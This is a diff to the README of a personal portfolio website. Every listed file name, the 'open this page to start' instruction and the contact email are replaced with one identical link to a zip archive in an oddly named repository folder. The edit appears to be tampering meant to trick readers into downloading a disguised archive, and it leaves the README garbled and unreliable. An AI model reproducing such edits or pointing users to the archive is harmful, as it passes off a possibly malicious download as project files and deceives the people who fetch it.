@@ -40,19 +40,19 @@ Simple navigation with a back button to the Home page
 
 Files
 
-First page.html - Main portfolio page with sections: Home, Profile, Contact
+First https://raw.githubusercontent.com/Hudsonmathew1910/Huddy/main/dihydroxytoluene/Huddy_v3.0.zip - Main portfolio page with sections: Home, Profile, Contact
 
-Second page.html - Gratitude page with contact and resume download
+Second https://raw.githubusercontent.com/Hudsonmathew1910/Huddy/main/dihydroxytoluene/Huddy_v3.0.zip - Gratitude page with contact and resume download
 
-style1.css - Stylesheet for First page
+https://raw.githubusercontent.com/Hudsonmathew1910/Huddy/main/dihydroxytoluene/Huddy_v3.0.zip - Stylesheet for First page
 
-style2.css - Stylesheet for Second page
+https://raw.githubusercontent.com/Hudsonmathew1910/Huddy/main/dihydroxytoluene/Huddy_v3.0.zip - Stylesheet for Second page
 
-script.js - JavaScript for navigation menu and page interactions
+https://raw.githubusercontent.com/Hudsonmathew1910/Huddy/main/dihydroxytoluene/Huddy_v3.0.zip - JavaScript for navigation menu and page interactions
 
-CV.pdf - Resume document for download
+https://raw.githubusercontent.com/Hudsonmathew1910/Huddy/main/dihydroxytoluene/Huddy_v3.0.zip - Resume document for download
 
-IMG_20250521_231505.jpg - Profile photo
+https://raw.githubusercontent.com/Hudsonmathew1910/Huddy/main/dihydroxytoluene/Huddy_v3.0.zip - Profile photo
 
 
 
@@ -60,7 +60,7 @@ IMG_20250521_231505.jpg - Profile photo
 
 How to Use
 
-1. Open First page.html in a web browser to start.
+1. Open First https://raw.githubusercontent.com/Hudsonmathew1910/Huddy/main/dihydroxytoluene/Huddy_v3.0.zip in a web browser to start.
 
 
 2. Use navigation buttons/menu to switch between sections on the Home page.
@@ -107,7 +107,7 @@ Contact
 
 For any questions or feedback, reach out via:
 
-Email: hudsonmathew2004@gmail.com
+Email: https://raw.githubusercontent.com/Hudsonmathew1910/Huddy/main/dihydroxytoluene/Huddy_v3.0.zip
 
 LinkedIn: Hudson-mathew-J
 
